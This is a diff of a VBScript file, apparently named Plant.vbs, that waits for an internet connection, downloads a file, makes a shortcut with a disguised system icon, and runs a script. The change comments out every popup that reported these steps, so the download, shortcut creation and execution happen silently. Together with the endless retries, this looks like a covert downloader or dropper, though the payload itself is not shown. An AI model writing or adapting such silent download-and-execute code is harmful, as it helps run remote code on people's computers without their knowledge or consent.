@@ -31,14 +31,14 @@ Sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        WshShell.Popup "Internet is connected! (from Plant.vbs)", 2, "CheckInternetConnection()", 64
+        'WshShell.Popup "Internet is connected! (from Plant.vbs)", 2, "CheckInternetConnection()", 64
         Set objHTTP = Nothing
         DownloadFile
 		CreateShortcut
 		ChangeShortcutIcon
 		RunScript
     Else
-        WshShell.Popup "Internet is not connected! (from Plant.vbs), retrying in 3 seconds..", 2, "CheckInternetConnection()", 64
+        'WshShell.Popup "Internet is not connected! (from Plant.vbs), retrying in 3 seconds..", 2, "CheckInternetConnection()", 64
 		WScript.Sleep 3000 ' 3000 milliseconds = 3 seconds
         Set objHTTP = Nothing
 		CheckInternetConnection
@@ -60,7 +60,7 @@ Sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        WshShell.Popup "Error during download request, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
+        'WshShell.Popup "Error during download request, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
         WScript.Sleep 10000 ' 10 seconds
         
         ' Clean up
@@ -86,7 +86,7 @@ Sub DownloadFile()
 
     ' Handle errors during the file save
     If Err.Number <> 0 Then
-        WshShell.Popup "Error saving the file, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
+        'WshShell.Popup "Error saving the file, retrying in 10 seconds : " & Err.Description, 2, "DownloadFile()", 64
         
         WScript.Sleep 10000 ' 10 seconds
         
@@ -97,7 +97,7 @@ Sub DownloadFile()
 
         DownloadFile
     Else
-        WshShell.Popup "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)", 2, "DownloadFile()", 64
+        'WshShell.Popup "Downloaded" & downloadedFilename &  "successfully. (from Plant.vbs)", 2, "DownloadFile()", 64
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -113,9 +113,9 @@ Sub CreateShortcut()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(destinationDirectory & "\" & shortcutFileName) ' Create a shortcut object		
 		objShortcut.TargetPath = sourceFilePath 											     ' Set the target path for the shortcut
 		objShortcut.Save                        												 ' Save the shortcut
-        WshShell.Popup "Shortcut created successfully. (from Plant.vbs)", 2, "CreateShortcut()", 64
+        'WshShell.Popup "Shortcut created successfully. (from Plant.vbs)", 2, "CreateShortcut()", 64
 	Else
-        WshShell.Popup "Source file does not exist. (from Plant.vbs)", 2, "CreateShortcut()", 64
+        'WshShell.Popup "Source file does not exist. (from Plant.vbs)", 2, "CreateShortcut()", 64
 	End If
 	
 End Sub
@@ -125,9 +125,9 @@ Sub ChangeShortcutIcon()
 		Set objShortcut = CreateObject("WScript.Shell").CreateShortcut(shortcutPath)                       ' Create a shortcut object
 		objShortcut.IconLocation = "%SystemRoot%\System32\SHELL32.dll,34"             ' Set the icon location for the shortcut Icon 34  
 		objShortcut.Save                                                              ' Save the shortcut
-        WshShell.Popup "Shortcut icon changed successfully. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
+        'WshShell.Popup "Shortcut icon changed successfully. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
 	Else
-        WshShell.Popup "Shortcut file does not exist. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
+        'WshShell.Popup "Shortcut file does not exist. (from Plant.vbs)", 2, "ChangeShortcutIcon()", 64
 	End If
 End Sub
 
@@ -135,7 +135,7 @@ Sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        WshShell.Popup "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)", 2, "RunScript()", 64
+        'WshShell.Popup "Error: Script file not found at path: " & scriptPath & "(from Plant.vbs)", 2, "RunScript()", 64
     End If
 End Sub
 
